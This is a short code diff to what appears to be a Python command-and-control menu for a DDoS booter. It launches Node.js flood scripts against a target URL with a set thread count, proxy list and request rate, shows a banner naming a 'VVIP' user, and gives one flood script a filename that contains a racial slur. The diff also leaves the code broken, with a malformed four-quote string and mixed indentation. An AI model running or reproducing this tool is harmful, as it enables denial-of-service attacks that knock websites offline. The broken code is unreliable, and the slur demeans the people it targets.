@@ -638,7 +638,6 @@ def main():
                 thread = cnc.split()[3]
                 proxy = cnc.split()[4]
                 rps = cnc.split()[5]
-                
                 os.system(f'node HTTP-NIGGA.js {url} {time} {thread} {proxy} {rps}')
 				os.system ("clear")
 				print(f"""
@@ -657,10 +656,7 @@ def main():
 \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
 \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
 \033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-            except IndexError:
-                print('Usage: BYPASS <url> <time> <thread> <http.txt> <request_persecond>')
-                print('Example: BYPASS https://example.com 60 10 http.txt 5000')
+""""
 			except ValueError:
 				main()
 			except IndexError:
@@ -671,7 +667,6 @@ def main():
                 url = cnc.split()[1]
                 thread = cnc.split()[2]
                 time = cnc.split()[3]
-                
                 os.system(f'node MIX.js {url} {thread} {time}')
 				os.system ("clear")
 				print(f"""
